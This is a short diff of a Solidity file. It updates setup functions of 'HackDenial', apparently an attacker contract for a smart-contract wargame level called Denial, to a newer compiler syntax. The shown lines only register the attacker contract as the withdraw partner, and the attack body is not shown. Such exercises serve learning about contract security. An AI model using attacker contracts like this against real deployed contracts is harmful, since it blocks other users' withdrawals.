@@ -39,12 +39,12 @@ contract Denial {
 contract HackDenial {
     Denial public denial;
 
-    function setDeinalContract(address denial_) public {
+    function setDeinalContract(address payable denial_) public {
         denial = Denial(denial_);
     }
 
     function setPartner() public {
-        denial.setWithdrawPartner(this);
+        denial.setWithdrawPartner(address(this));
     }
 
     function callWithdraw() public {
